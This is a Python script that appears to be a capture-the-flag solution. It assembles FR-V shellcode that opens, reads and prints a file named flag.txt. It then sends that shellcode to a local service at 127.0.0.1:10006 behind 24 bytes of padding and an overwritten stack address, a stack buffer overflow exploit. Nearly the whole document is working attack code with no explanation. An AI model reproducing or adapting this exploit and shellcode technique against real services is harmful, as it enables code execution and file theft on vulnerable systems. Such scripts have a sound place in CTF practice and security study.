asm = '''.section .text
.global _start

.ascii "%s"
_start:
    xor gr20, gr20, gr20
    bra get_addr
ret:
    movsg lr, gr19
open:
    mov gr19, gr8
    mov gr20, gr9
    mov gr20, gr10
    setlos 0x2,gr7
    tira gr0,0
read:
    mov gr19, gr9
    setlo 0x7f,gr10
    setlos 0x4,gr7
    tira gr0,0
write:
    setlo 0x1, gr8
    mov gr19, gr9
    setlo 0x7f,gr10
    setlos 0x5,gr7
    tira gr0,0
get_addr:
    call ret
.ascii "%s"
  '''
import os
from lib.mylib import *

ARCH = 'frv'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'

asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10006
s = mysock(IP, PORT)
sl(s, '\n000')
SP = 0x1afc
shellcode = 'AAAAAAAAAAAAAAAAAAAAAAAA' + pb(SP) + shellcode + '\n'
sl(s, shellcode)
shell(s)
